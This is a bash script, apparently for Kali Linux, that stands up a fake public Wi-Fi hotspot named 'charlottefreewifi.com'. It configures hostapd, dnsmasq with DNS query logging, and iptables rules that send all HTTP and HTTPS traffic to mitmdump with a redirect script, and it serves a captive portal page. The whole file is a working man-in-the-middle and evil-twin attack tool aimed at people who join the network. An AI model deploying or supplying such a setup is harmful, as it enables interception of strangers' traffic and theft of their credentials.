#!/bin/bash

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root."
   exit 1
fi

# Variables
INTERFACE="wlan0"       # Wireless interface
MONITOR_INTERFACE="wlan0" # Monitor mode interface created by airmon-ng
GATEWAY="192.168.1.1"
SUBNET="255.255.255.0"
ETH_INTERFACE="eth0"    # Ethernet/WAN interface
DNSMASQ_CONF="/tmp/dnsmasq.conf"
HOSTAPD_CONF="/tmp/hostapd.conf"

# Stop interfering services
echo "Stopping interfering services..."
airmon-ng check kill

# Start monitor mode
echo "Enabling monitor mode on $INTERFACE..."
airmon-ng start $INTERFACE

# Configure hostapd
echo "Configuring hostapd..."
cat <<EOF > $HOSTAPD_CONF
interface=$MONITOR_INTERFACE
ssid=charlottefreewifi.com
channel=1
EOF

# Configure dnsmasq
echo "Configuring dnsmasq..."
cat <<EOF > $DNSMASQ_CONF
interface=$MONITOR_INTERFACE
dhcp-range=192.168.1.50,192.168.1.150,$SUBNET,12h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
server=8.8.8.8
log-queries
log-dhcp
listen-address=$GATEWAY
address=/charlottefreewifi.com/192.168.1.1
EOF

# Create three terminal windows
echo "Opening terminals and setting up services..."

# Terminal 1: Start hostapd
gnome-terminal -- bash -c "echo 'Starting hostapd...'; hostapd $HOSTAPD_CONF; exec bash"

# Terminal 2: Configure interface, route, and start dnsmasq
gnome-terminal -- bash -c "
    echo 'Configuring interface and starting dnsmasq...';
    ifconfig $MONITOR_INTERFACE up $GATEWAY netmask $SUBNET;
    route add -net 192.168.1.0 netmask $SUBNET gw $GATEWAY;
    dnsmasq -C $DNSMASQ_CONF -d;
    exec bash
"

# Terminal 3: Configure iptables and enable IP forwarding
gnome-terminal -- bash -c "
    echo 'Setting up iptables and enabling IP forwarding...';
    iptables -t nat -A POSTROUTING -o $ETH_INTERFACE -j MASQUERADE;
    iptables -A FORWARD -i $MONITOR_INTERFACE -j ACCEPT;
    echo 1 > /proc/sys/net/ipv4/ip_forward;
    
    iptables -t nat -A POSTROUTING -o $MONITOR_INTERFACE -j MASQUERADE;
    iptables -t nat -A PREROUTING -i $MONITOR_INTERFACE  -p tcp --dport 443 -j REDIRECT --to-port 8080;
    iptables -t nat -A PREROUTING -i $MONITOR_INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 8080;
    mitmdump -s redirect.py --ssl-insecure
    exec bash
"

gnome-terminal -- bash -c "
	echo 'Setting up Captive Portal Server';
	cd /home/kali/access_point/CaptivePortal;
	python -m http.server 8081;
	exec bash
"
 
echo "All terminals have been set up. Fake access point is running."
